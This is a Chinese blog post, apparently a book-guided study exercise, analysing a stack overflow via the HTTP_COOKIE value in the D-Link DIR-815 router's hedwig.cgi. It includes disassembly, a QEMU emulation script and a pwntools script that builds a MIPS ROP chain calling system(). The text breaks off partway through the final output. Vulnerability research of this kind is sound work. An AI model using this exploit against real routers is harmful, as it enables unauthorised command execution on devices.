@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/a.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/a.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Consolas:300,300italic,400,400italic,700,700italic|Times New Roman:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ll1ng.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","width":300,"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 《揭秘》的第一个漏洞分析。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D-Link DIR-815路由器多次溢出漏洞分析">
+<meta property="og:url" content="http://ll1ng.github.io/2021/11/02/long-value-cookie/index.html">
+<meta property="og:site_name" content="here&#39;s ling&#39;s blog">
+<meta property="og:description" content="&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 《揭秘》的第一个漏洞分析。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/11/03/F3iVxug5WYzIB7L.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/03/Rvl4dLyXKuSCDsN.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/03/cCHxP1ZOpTq8IGK.png">
+<meta property="article:published_time" content="2021-11-02T09:07:16.000Z">
+<meta property="article:modified_time" content="2021-11-02T09:07:16.000Z">
+<meta property="article:author" content="ling">
+<meta property="article:tag" content="漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/03/F3iVxug5WYzIB7L.png">
+
+<link rel="canonical" href="http://ll1ng.github.io/2021/11/02/long-value-cookie/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>D-Link DIR-815路由器多次溢出漏洞分析 | here's ling's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="here's ling's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">here's ling's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">月が绮丽ですね</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">11</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://ll1ng.github.io/2021/11/02/long-value-cookie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/%E7%A9%B9.jpg">
+      <meta itemprop="name" content="ling">
+      <meta itemprop="description" content="永远不要停止思考啊">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="here's ling's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          D-Link DIR-815路由器多次溢出漏洞分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-02 17:07:16" itemprop="dateCreated datePublished" datetime="2021-11-02T17:07:16+08:00">2021-11-02</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>&nbsp; &nbsp; &nbsp; &nbsp; 《揭秘》的第一个漏洞分析。</p>
+<span id="more"></span>
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>&nbsp; &nbsp; &nbsp; &nbsp; &ensp;该漏洞的描述位于<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33863">这里</a>，可知漏洞出现在<code>hedwig.cgi</code>文件中。首先了解一下<code>cgi</code>文件。</p>
+<blockquote>
+<p><code>cgi(Common Gateway Interface)</code>，通用网关接口。运行在服务器上提供同客户端 HTML 页面的接口的一段程序。</p>
+</blockquote>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 这类文件大概功能就是根据客户端提交的请求生成html页面（？）先获得<a target="_blank" rel="noopener" href="http://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/DIR-815_REVA_FIRMWARE_v1.01.ZIP">固件</a>，<code>unzip</code>得到<code>.bin</code>文件，<code>binwalk -e </code>得到文件系统。在文件系统下<code>find . -name  hedwig.cgi</code>，得到的文件是指向<code>./htdocs/cgibin</code>文件的一个符号链接。故对<code>cgibin</code>文件进行分析。</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 根据漏洞描述可知漏洞出现的位置与<code>cookie</code>的值有关，搜索<code>cookie</code>字符串的引用。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00407C98                 .globl sess_get_uid</span><br><span class="line">.text:00407C98 sess_get_uid:                            # CODE XREF: phpcgi_main+214↑p</span><br><span class="line">.text:00407C98                                          # authentication+338↓p ...</span><br><span class="line">.text:00407C98</span><br><span class="line">...</span><br><span class="line">.text:00407D00                 la      $t9, getenv</span><br><span class="line">.text:00407D04                 li      $a0, aHttpCookie  # &quot;HTTP_COOKIE&quot;</span><br><span class="line">.text:00407D08                 jalr    $t9 ; getenv</span><br><span class="line">.text:00407D0C                 move    $s3, $v0</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 可知<code>cookie</code>的值是函数<code>sess_get_id</code>调用<code>getenv(&quot;HTTP_COOKIE&quot;)</code>得到的。<code>char *getenv(const char *name);</code>该函数返回一个指向该环境变量值的指针。再查找函数<code>sess_get_id</code>的引用：</p>
+<img src="https://i.loli.net/2021/11/03/F3iVxug5WYzIB7L.png" alt="image-20211102201112980" style="zoom:50%;" />
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 还挺多。书上说去找<code>hedwigcgi_main</code>内的引用，可能是因为存在漏洞的文件名是<code>hedwig.cgi</code>吧。于是跳过去查看，发现了危险函数<code>sprintf</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00409640                 la      $t9, sess_get_uid</span><br><span class="line">.text:00409644                 nop</span><br><span class="line">.text:00409648                 jalr    $t9 ; sess_get_uid</span><br><span class="line">.text:0040964C                 move    $a0, $s5</span><br><span class="line">.text:00409650                 lw      $gp, 0x4C0+var_4B0($sp)</span><br><span class="line">.text:00409654                 nop</span><br><span class="line">.text:00409658                 la      $t9, sobj_get_string</span><br><span class="line">.text:0040965C                 nop</span><br><span class="line">.text:00409660                 jalr    $t9 ; sobj_get_string</span><br><span class="line">.text:00409664                 move    $a0, $s5</span><br><span class="line">.text:00409668                 lw      $gp, 0x4C0+var_4B0($sp)</span><br><span class="line">.text:0040966C                 lui     $a1, 0x42  # &#x27;B&#x27;</span><br><span class="line">.text:00409670                 la      $t9, sprintf</span><br><span class="line">.text:00409674                 move    $a3, $v0</span><br><span class="line">.text:00409678                 move    $a2, $s2</span><br><span class="line">.text:0040967C                 li      $a1, aSSPostxml  # &quot;%s/%s/postxml&quot;</span><br><span class="line">.text:00409680                 jalr    $t9 ; sprintf</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 继续查看函数<code>hedwigcgi_main</code>的引用，发现只有<code>main</code>调用了，所以通过分析<code>hedwigcgi_main</code>的逻辑设置环境变量。</p>
+<img src="https://i.loli.net/2021/11/03/Rvl4dLyXKuSCDsN.png" alt="image-20211102202521384" style="zoom:50%;" />
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 函数<code>hedwigcgi_main</code>首先获得<code>REQUEST_METHOD</code>的值，不为<code>POST</code>则打印失败信息。接着调用<code>cgibin_parse_request</code>，获得<code>CONTENT_TYPE</code>和<code>CONTENT_LENGTH</code>的值（总之经过一堆判断这俩都不能为空）。用下面这段来判断这两个值需要满足的条件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if ( type )</span><br><span class="line">&#123;</span><br><span class="line">    relo_item = p2rel_42C014;             // application/</span><br><span class="line">    v16 = 0;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">        name = relo_item-&gt;name;</span><br><span class="line">        if ( !relo_item-&gt;name )</span><br><span class="line">        break;</span><br><span class="line">        str_len = relo_item-&gt;size;</span><br><span class="line">        ++relo_item;</span><br><span class="line">        ++v16;</span><br><span class="line">        if ( !strncasecmp(type, name, str_len) )</span><br><span class="line">        	return ((int (__fastcall *)(int, int, unsigned int, char *))p2rel_42C014[v16 - 1].func)(</span><br><span class="line">        a1,</span><br><span class="line">        a2_0,</span><br><span class="line">        content_length,</span><br><span class="line">        &amp;type[str_len]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 而<code>p2rel_42C014</code>处的符号地址字段对<code>type</code>后面的字符进行判断，需等于<code>x-www-form-urlencoded</code>。然后调用<code>sobj_new</code>创建两个大小为6的指针数组，偏移为5处存放<code>cookie</code>。调用<code>sess_get_uid</code>，得到<code>HTTP_COOKIE</code>的值。同样创建两个指针数组<code>a1,a2</code>，以等号为界将前半部分存入<code>a1</code>偏移为5处，后半部分存入<code>a2</code>偏移为5处，<code>a1[5]</code>为<code>uid</code>则将<code>a2[5]</code>存入参数指针数组的偏移为5处。函数<code>sobj_get_string</code>获得该数组中指向<code>cookie</code>的指针。（<code>REMOTE_ADDR</code>应该不用填）接着到了<code>sprintf</code>函数，而在这之下有另一个<code>sprintf</code>函数，据书上说明测试后远程是有<code>/var/tmp</code>目录的，所以造成漏洞的是第二个<code>sprintf</code>。</p>
+<h2 id="模拟运行"><a href="#模拟运行" class="headerlink" title="模拟运行"></a>模拟运行</h2><p>几个环境变量的值有以下要求：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REQUEST_METHOD: POST</span><br><span class="line">CONTENT_TYPE: application/x-www-form-urlencoded</span><br><span class="line">CONTENT_LENGTH: 不太懂，暂时设成payload长度</span><br><span class="line">REQUEST_URI: 不为空</span><br><span class="line">REMOTE_ADDR: *</span><br><span class="line">HTTP_COOKIE: uid=...</span><br></pre></td></tr></table></figure>
+
+<p>写个<code>shell</code>脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">exp.sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">when you execute the file <span class="keyword">for</span> the first time,</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu</span></span><br><span class="line"></span><br><span class="line">python 815.py</span><br><span class="line"></span><br><span class="line">INPUT=$(cat payload)</span><br><span class="line">LEN=$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line">PORT=&quot;1234&quot;</span><br><span class="line"></span><br><span class="line">if [ -n &quot;$1&quot; ] ;then   # $1 exists</span><br><span class="line">	echo &quot;$INPUT&quot; | chroot . ./qemu \</span><br><span class="line">	-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">	-E HTTP_COOKIE=$INPUT \</span><br><span class="line">	-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">	-E CONTENT_LENGTH=$LEN \</span><br><span class="line">	-E REQUEST_URI=&quot;a&quot; \</span><br><span class="line">	-g $PORT \</span><br><span class="line">	/htdocs/web/hedwig.cgi	</span><br><span class="line">else </span><br><span class="line">	echo &quot;$INPUT&quot; | chroot . ./qemu \</span><br><span class="line">	-E REQUEST_METHOD=&quot;POST&quot; \</span><br><span class="line">	-E HTTP_COOKIE=$INPUT \</span><br><span class="line">	-E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \</span><br><span class="line">	-E CONTENT_LENGTH=$LEN \</span><br><span class="line">	-E REQUEST_URI=&quot;a&quot; \</span><br><span class="line">	/htdocs/web/hedwig.cgi	</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
+
+<p>写个<code>python</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;815.py&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base=<span class="number">0x76738000</span></span><br><span class="line">gadget1=<span class="number">0x158c8</span> <span class="comment"># s0+1,-&gt;s5</span></span><br><span class="line">gadget2=<span class="number">0x159CC</span> <span class="comment"># sp+0x18-&gt;a0, -&gt;s0</span></span><br><span class="line"></span><br><span class="line">pd=<span class="string">&#x27;uid=12345&#x27;</span></span><br><span class="line">regs=flat(</span><br><span class="line">base+<span class="number">0x531ff</span>,<span class="comment"># s0</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s1</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s2</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s3</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s4</span></span><br><span class="line">base+gadget2,<span class="comment"># s5</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s6</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># s7</span></span><br><span class="line"><span class="string">&#x27;aaaa&#x27;</span>,<span class="comment"># fp</span></span><br><span class="line">base+gadget1,<span class="comment"># ra</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pd+=regs.rjust(<span class="number">1008</span>,<span class="string">&#x27;a&#x27;</span>)+<span class="number">0x10</span>*<span class="string">&#x27;b&#x27;</span>+<span class="string">&#x27;/bin/ls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(pd)</span><br></pre></td></tr></table></figure>
+
+<p>在<code>./.gdbinit</code>下写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; 用<code>sudo ./exp.sh -g</code>启动脚本。若在另一个命令行输入<code>gdb-multiarch ./htdocs/web/hedwig.cgi</code>，则用<code>pwndbg</code>进行调试。也可以用<code>ida attach</code>上进程进行调试。函数最终执行到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A28 lw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409A2C move    $v0, $s7</span><br><span class="line">.text:00409A30 lw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">.text:00409A34 lw      $s7, 0x4C0+var_s1C($sp)</span><br><span class="line">.text:00409A38 lw      $s6, 0x4C0+var_s18($sp)</span><br><span class="line">.text:00409A3C lw      $s5, 0x4C0+var_s14($sp)</span><br><span class="line">.text:00409A40 lw      $s4, 0x4C0+var_s10($sp)</span><br><span class="line">.text:00409A44 lw      $s3, 0x4C0+var_sC($sp)</span><br><span class="line">.text:00409A48 lw      $s2, 0x4C0+var_s8($sp)</span><br><span class="line">.text:00409A4C lw      $s1, 0x4C0+var_s4($sp)</span><br><span class="line">.text:00409A50 lw      $s0, 0x4C0+var_s0($sp)</span><br><span class="line">.text:00409A54 jr      $ra</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 查看栈上内容发现已被传入的<code>cookie</code>值覆盖。考虑通过控制这些寄存器的值来控制程序执行流。这个地方需要注意不能用程序原有的<code>gadgets</code>，因为地址中有<code>\0</code>被截断。需要利用<code>libc</code>中的<code>gadgets</code>。</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 先找到运行时的基地址。程序貌似什么保护都没开所以所有地址都是固定的。同样符合动态链接第一次执行时先对符号进行链接的规则。在第二次调用<code>sprintf</code>处下断点，得到了<code>sprintf</code>地址。</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; <code>ldd</code>一下程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ling@ubuntu:~/iot/jm/dir815_FW_101/_DIR-815 FW 1.01b14_1.01b14.bin.extracted/squashfs-root$ ldd ./htdocs/cgibin</span><br><span class="line">checking sub-depends for &#x27;not found&#x27;</span><br><span class="line">checking sub-depends for &#x27;not found&#x27;</span><br><span class="line">	libgcc_s.so.1 =&gt; not found (0x00000000)</span><br><span class="line">	libc.so.0 =&gt; not found (0x00000000)</span><br><span class="line">	/lib/ld-uClibc.so.0 =&gt; /lib/ld-uClibc.so.0 (0x00000000)</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 把<code>libc.so.0</code>链接的文件拖入<code>ida</code>分析，找到<code>sprintf</code>的偏移。用上面得到的<code>sprintf</code>地址减去偏移得到基地址。（用这个办法主要是因为我用不了<code>vmmap</code>…）接着找到<code>system</code>偏移为<code>0x53200</code>，同样会被截断，考虑运算后再得到<code>0x53200</code>。</p>
+<h2 id="构造ROP链"><a href="#构造ROP链" class="headerlink" title="构造ROP链"></a>构造ROP链</h2><p>接下来找<code>libc</code>里能用的<code>gadgets</code>。在<code>idapython</code>里输入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mipsrop <span class="keyword">import</span> MIPSROPFinder</span><br><span class="line">mips=MIPSROPFinder()</span><br><span class="line"><span class="comment"># 调用mips.find(&#x27;&#x27;)得到相应的gadgets</span></span><br></pre></td></tr></table></figure>
+
+<p>先将<code>$s0</code>覆盖为<code>base+0x531ff</code>，再对<code>$s0+1</code>。</p>
+<p><img src="https://i.loli.net/2021/11/03/cCHxP1ZOpTq8IGK.png" alt="idapython.jpg"></p>
+<p>查看偏移处内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:000158C8                 move    $t9, $s5</span><br><span class="line">.text:000158CC                 jalr    $t9</span><br><span class="line">.text:000158D0                 addiu   $s0, 1</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> 这里注意一下指令执行的顺序。在<code>ida</code>的<code>python</code>框里输入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line"><span class="built_in">help</span>(mipsrop)</span><br></pre></td></tr></table></figure>
+
+<p>文档里有这么一句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#    move $t9, $s1</span><br><span class="line">#    jalr $t9</span><br><span class="line">#    li $a0, 1    &lt;-- Remember MIPS has jump delay slots, so this instruction</span><br><span class="line">#    is executed with the jump</span><br></pre></td></tr></table></figure>
+
+<p>查了一下说由于这个什么延迟机制，<code>jalr</code>后的语句（不知道几条）在执行<code>jalr</code>之前执行。找了个<code>jalr</code>在后一句下了断点，确实是在该句执行完后才执行的<code>jalr</code>。（大概和流水线、编译原理、<code>CPU</code>有关，尚未深究……）</p>
+</blockquote>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 得到了一条<code>gadget</code>。同样由于这个机制，在执行到结尾时，会先执行<code>00409A58</code>处将栈恢复，此时就可以在离<code>$sp</code>较近的位置找到输入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A28                 lw      $ra, 0x4C0+var_s24($sp)</span><br><span class="line">.text:00409A2C                 move    $v0, $s7</span><br><span class="line">.text:00409A30                 lw      $fp, 0x4C0+var_s20($sp)</span><br><span class="line">.text:00409A34                 lw      $s7, 0x4C0+var_s1C($sp)</span><br><span class="line">...</span><br><span class="line">.text:00409A50                 lw      $s0, 0x4C0+var_s0($sp)</span><br><span class="line">.text:00409A54                 jr      $ra</span><br><span class="line">.text:00409A58                 addiu   $sp, 0x4E8</span><br></pre></td></tr></table></figure>
+
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 再找给<code>system</code>传参的<code>gadget</code>。需将<code>/bin//sh</code>字符串地址传给<code>$a0</code>。</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; 执行<code>mips.stackfinders()</code>，找到这样一条比较方便。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000159CC  |  addiu $s5,$sp,0x14C+var_13C                      |  jalr  $s0    |</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000159CC                 addiu   $s5, $sp, 0x14C+var_13C</span><br><span class="line">.text:000159D0                 move    $a1, $s3</span><br><span class="line">.text:000159D4                 move    $a2, $s1</span><br><span class="line">.text:000159D8                 move    $t9, $s0</span><br><span class="line">.text:000159DC                 jalr    $t9 ; mempcpy</span><br><span class="line">.text:000159E0                 move    $a0, $s5</span><br></pre></td></tr></table></figure>
+
+<p>最后构造好运行的结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 